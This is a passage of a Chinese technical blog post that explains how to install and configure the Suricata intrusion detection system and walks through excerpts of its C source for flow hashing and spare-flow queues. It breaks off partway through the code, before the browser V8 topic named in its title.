<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Suricata通过共享内存获取流量+pwn-浏览器内核V8 | h3110w0r1d's Blog</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Suricata通过共享内存获取流量IntroductionSuricata是一个高性能的网络入侵检测和防御系统（IDS&#x2F;IPS）。它是由OISF开发，完全开源，并且可以免费使用。https:&#x2F;&#x2F;github.com&#x2F;OISF&#x2F;suricata Suricata由线程和队列组成，数据包在线程间传递通过队列实现。线程由多个线程模块组成，每个线程模块实现一种功能。 Suricata有多种运行模式，这些">
<meta property="og:type" content="article">
<meta property="og:title" content="Suricata通过共享内存获取流量+pwn-浏览器内核V8">
<meta property="og:url" content="http://dezhoutorizhao.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/index.html">
<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
<meta property="og:description" content="Suricata通过共享内存获取流量IntroductionSuricata是一个高性能的网络入侵检测和防御系统（IDS&#x2F;IPS）。它是由OISF开发，完全开源，并且可以免费使用。https:&#x2F;&#x2F;github.com&#x2F;OISF&#x2F;suricata Suricata由线程和队列组成，数据包在线程间传递通过队列实现。线程由多个线程模块组成，每个线程模块实现一种功能。 Suricata有多种运行模式，这些">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
<meta property="article:published_time" content="2024-07-13T12:56:47.918Z">
<meta property="article:modified_time" content="2024-08-01T08:59:50.068Z">
<meta property="article:author" content="h3110w0r1d">
<meta property="article:tag" content="勇敢的面对阳光，阴影自然都在身后">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Suricata通过共享内存获取流量+pwn-浏览器内核V8',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-01 16:59:50'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Suricata通过共享内存获取流量+pwn-浏览器内核V8</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-13T12:56:47.918Z" title="发表于 2024-07-13 20:56:47">2024-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-01T08:59:50.068Z" title="更新于 2024-08-01 16:59:50">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Suricata通过共享内存获取流量+pwn-浏览器内核V8"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Suricata通过共享内存获取流量"><a href="#Suricata通过共享内存获取流量" class="headerlink" title="Suricata通过共享内存获取流量"></a>Suricata通过共享内存获取流量</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Suricata是一个高性能的网络入侵检测和防御系统（IDS/IPS）。它是由OISF开发，完全开源，并且可以免费使用。<a target="_blank" rel="noopener" href="https://github.com/OISF/suricata">https://github.com/OISF/suricata</a></p>
<p>Suricata由线程和队列组成，数据包在线程间传递通过队列实现。线程由多个线程模块组成，每个线程模块实现一种功能。</p>
<p>Suricata有多种运行模式，这些模式与抓包驱动和IDS/IPS选择相关联。抓包驱动如：pcap, pcap file, nfqueue, ipfw, dpdk或者一个特有的抓包驱动等。Suricata在启动时只能选择某个运行模式。如-i选项表示pcap，-r表示pcapfile，-q表示nfqueue等。每一种运行模式都会初始化一些threads, queues等。模式的具体任务是由线程模块来完成。根据线程和线程模块的组织方式的不同，我们可以./suricata –list-runmodes查看运行模式，运行模式又细分为”autofp”, “single”,“wokers”。</p>
<p>Suricata 针对每种运行模式实现了对应的 ThreadVars 数据结构，从而在线程程度上操作数据。对应的数据结构分别位于对应模式的source文件里面，命名为：模式名字+ThreadVars。</p>
<p>共享内存(shared memory)指在多处理器的计算机系统中，可以被不同中央处理器（CPU）访问的大容量内存。由于多个CPU需要快速访问存储器，这样就要对存储器进行缓存（Cache）。任何一个缓存的数据被更新后，由于其他处理器也可能要存取，共享内存就需要立即更新，否则不同的处理器可能用到不同的数据。共享内存是 Unix下的多进程之间的通信方法，这种方法通常用于一个程序的多进程间通信，实际上多个程序间也可以通过共享内存来传递信息。</p>
<h2 id="Suricata安装"><a href="#Suricata安装" class="headerlink" title="Suricata安装"></a>Suricata安装</h2><ol>
<li><p>添加 Suricata PPA（个人包档案）并安装 Suricata,添加 OISF（Open Information Security Foundation）的 PPA：</p>
  <pre class="line-numbers language-none"><code class="language-none">sudo add-apt-repository ppa:oisf&#x2F;suricata-stable
sudo apt update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714141047.png"></p>
</li>
<li><p>安装 Suricata：</p>
  <pre class="line-numbers language-none"><code class="language-none">sudo apt install suricata -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714141152.png"></p>
</li>
<li><p>安装完成后，运行以下命令以验证 Suricata 是否正确安装：</p>
  <pre class="line-numbers language-none"><code class="language-none">suricata --build-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714141225.png"></p>
</li>
</ol>
<h2 id="Suricata配置"><a href="#Suricata配置" class="headerlink" title="Suricata配置"></a>Suricata配置</h2><ol>
<li><p>创建配置文件的备份，修改之前一定要先备份</p>
  <pre class="line-numbers language-none"><code class="language-none">sudo cp &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  Suricata的可执行文件默认在/usr/bin下，配置文件默认在/etc/suricata下</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714142855.png"></p>
</li>
<li><p>可以通过Suricata内置的测试模式检查配置文件和其他规则的有效性</p>
  <pre class="line-numbers language-none"><code class="language-none">sudo suricata -T -c &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714143154.png"></p>
</li>
<li><p>  在/etc/suricata/suricata.yaml中可以更改要监控的网络接口</p>
</li>
</ol>
<h2 id="运行前的测试"><a href="#运行前的测试" class="headerlink" title="运行前的测试"></a>运行前的测试</h2><ol>
<li><p>  以下是我笔记本上的各个网络接口</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714143502.png"></p>
</li>
<li><p>这里我用wifi0接口测试能否正常运行</p>
  <pre class="line-numbers language-none"><code class="language-none">sudo suricata -c &#x2F;etc&#x2F;suricata&#x2F;suricata.yaml -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

</li>
</ol>
<h2 id="Suricata运行模式"><a href="#Suricata运行模式" class="headerlink" title="Suricata运行模式"></a>Suricata运行模式</h2><ol>
<li>  Suricata有多种运行模式，这些模式与抓包驱动和IDS/IPS选择相关联。抓包驱动如：pcap, pcap file, nfqueue,ipfw, dpdk或者一个特有的抓包驱动等。Suricata在启动时只能选择某个运行模式。如-i选项表示pcap， -r表示pcapfile，-q表示nfqueue等。每一种运行模式都会初始化一些threads,queues等。模式的具体任务是由线程模块来完成。根据线程和线程模块的组织方式的不同，运行模式又细分为”autofp”, “single”,“wokers”.</li>
<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240714154354.png"></li>
</ol>
<h3 id="IDS（入侵检测系统）模式"><a href="#IDS（入侵检测系统）模式" class="headerlink" title="IDS（入侵检测系统）模式"></a>IDS（入侵检测系统）模式</h3><ol>
<li><p>  <strong>特点</strong>：仅检测不阻止。</p>
</li>
<li><p>  <strong>数据获取</strong>：通常使用 Libpcap 或 AF_PACKET 抓包。</p>
</li>
<li><p>  <strong>流程</strong>：网络接口 -&gt; 抓包驱动 -&gt; Suricata -&gt; 检测引擎 -&gt; 日志/报警。</p>
</li>
<li><p>  <strong>优势</strong>：简单配置，不影响流量。</p>
</li>
<li><p>  <strong>劣势</strong>：不能阻止攻击，只能告警。</p>
</li>
</ol>
<h3 id="IPS（入侵防御系统）模式"><a href="#IPS（入侵防御系统）模式" class="headerlink" title="IPS（入侵防御系统）模式"></a>IPS（入侵防御系统）模式</h3><ol>
<li><p>  <strong>特点</strong>：检测并阻止。</p>
</li>
<li><p>  <strong>数据获取</strong>：通常使用 NFQUEUE 或 AF_PACKET 抓包。</p>
</li>
<li><p>  <strong>流程</strong>：网络接口 -&gt; 抓包驱动 -&gt; Suricata -&gt; 检测引擎 -&gt; 阻止/通过流量。</p>
</li>
<li><p>  <strong>优势</strong>：可以阻止攻击。</p>
</li>
<li><p>  <strong>劣势</strong>：配置复杂，可能影响网络性能。</p>
</li>
</ol>
<h3 id="流的分配"><a href="#流的分配" class="headerlink" title="流的分配"></a>流的分配</h3><ol>
<li><p>当suricata收到一个特定协议（<code>ipv6</code>, <code>icmp</code>, <code>sctp</code>,<code>tcp</code>,<code>udp</code>）的packet后，会计算一个流的hash值，设置<code>PKT_WANTS_FLOW</code>标志。</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowSetupPacket</span><span class="token punctuation">(</span>Packet <span class="token operator">*</span>p<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    p<span class="token operator">-></span>flags <span class="token operator">|=</span> PKT_WANTS_FLOW<span class="token punctuation">;</span>
    p<span class="token operator">-></span>flow_hash <span class="token operator">=</span> <span class="token function">FlowGetHash</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><code>FlowWorker</code>会基于<code>PKT_WANTS_FLOW</code>标志，进行流的查找或分配。</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> TmEcode <span class="token function">FlowWorker</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> Packet <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> PacketQueue <span class="token operator">*</span>preq<span class="token punctuation">,</span> PacketQueue <span class="token operator">*</span>unused<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">/* handle Flow */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>flags <span class="token operator">&amp;</span> PKT_WANTS_FLOW<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">FLOWWORKER_PROFILING_START</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> PROFILE_FLOWWORKER_FLOW<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">FlowHandlePacket</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> fw<span class="token operator">-></span>dtv<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>p<span class="token operator">-></span>flow <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">DEBUG_ASSERT_FLOW_LOCKED</span><span class="token punctuation">(</span>p<span class="token operator">-></span>flow<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FlowUpdate</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> fw<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> TM_ECODE_DONE<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>通过对流进行哈希检索:查找包含流指针的哈希桶</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowHandlePacket</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> DecodeThreadVars <span class="token operator">*</span>dtv<span class="token punctuation">,</span> Packet <span class="token operator">*</span>p<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowGetFlowFromHash</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> dtv<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token operator">-></span>flow<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    p<span class="token operator">-></span>flags <span class="token operator">|=</span> PKT_HAS_FLOW<span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Flow <span class="token operator">*</span><span class="token function">FlowGetFlowFromHash</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> DecodeThreadVars <span class="token operator">*</span>dtv<span class="token punctuation">,</span> <span class="token keyword">const</span> Packet <span class="token operator">*</span>p<span class="token punctuation">,</span> Flow <span class="token operator">*</span><span class="token operator">*</span>dest<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token comment">/* get our hash bucket and lock it */</span>
    <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> hash <span class="token operator">=</span> p<span class="token operator">-></span>flow_hash<span class="token punctuation">;</span>
    FlowBucket <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span>flow_hash<span class="token punctuation">[</span>hash <span class="token operator">%</span> flow_config<span class="token punctuation">.</span>hash_size<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">FBLOCK_LOCK</span><span class="token punctuation">(</span>fb<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>如果桶内没有任何流，分配一条新的流</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fb<span class="token operator">-></span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      f <span class="token operator">=</span> <span class="token function">FlowGetNew</span><span class="token punctuation">(</span>tv<span class="token punctuation">,</span> dtv<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">FBLOCK_UNLOCK</span><span class="token punctuation">(</span>fb<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
     
      <span class="token comment">/* flow is locked */</span>
      fb<span class="token operator">-></span>head <span class="token operator">=</span> f<span class="token punctuation">;</span>
      fb<span class="token operator">-></span>tail <span class="token operator">=</span> f<span class="token punctuation">;</span>
     
      <span class="token comment">/* got one, now lock, initialize and return */</span>
      <span class="token function">FlowInit</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
      f<span class="token operator">-></span>flow_hash <span class="token operator">=</span> hash<span class="token punctuation">;</span>
      f<span class="token operator">-></span>fb <span class="token operator">=</span> fb<span class="token punctuation">;</span>
      <span class="token function">FlowUpdateState</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> FLOW_STATE_NEW<span class="token punctuation">)</span><span class="token punctuation">;</span>
     
      <span class="token function">FlowReference</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
     
      <span class="token function">FBLOCK_UNLOCK</span><span class="token punctuation">(</span>fb<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> f<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>将包与找到的流进行比较</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token comment">/* see if this is the flow we are looking for */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FlowCompare</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        Flow <span class="token operator">*</span>pf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">/* previous flow */</span>

        <span class="token keyword">while</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FlowCompare</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">return</span> f<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="流的队列"><a href="#流的队列" class="headerlink" title="流的队列"></a>流的队列</h3><h4 id="spare队列"><a href="#spare队列" class="headerlink" title="spare队列"></a>spare队列</h4><ol>
<li><p>spare队列存储着备用的、未使用的、预分配的流。</p>
  <pre class="line-numbers language-none"><code class="language-none">FlowQueue flow_spare_q;
FlowQueueInit(&amp;flow_spare_q);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h4 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h4><p><code>flow_spare_q</code>的入队的操作，主要发生在：</p>
<ol>
<li><p>初始化时的预分配</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowInitConfig</span><span class="token punctuation">(</span><span class="token keyword">char</span> quiet<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment">/* pre allocate flows */</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowAlloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">SCLogError</span><span class="token punctuation">(</span>SC_ERR_FLOW_INIT<span class="token punctuation">,</span> <span class="token string">"preallocating flow failed: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>流管理检查时的补足</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FlowUpdateSpareFlows</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        toalloc <span class="token operator">=</span> flow_config<span class="token punctuation">.</span>prealloc <span class="token operator">-</span> len<span class="token punctuation">;</span>

        <span class="token class-name">uint32_t</span> i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> toalloc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
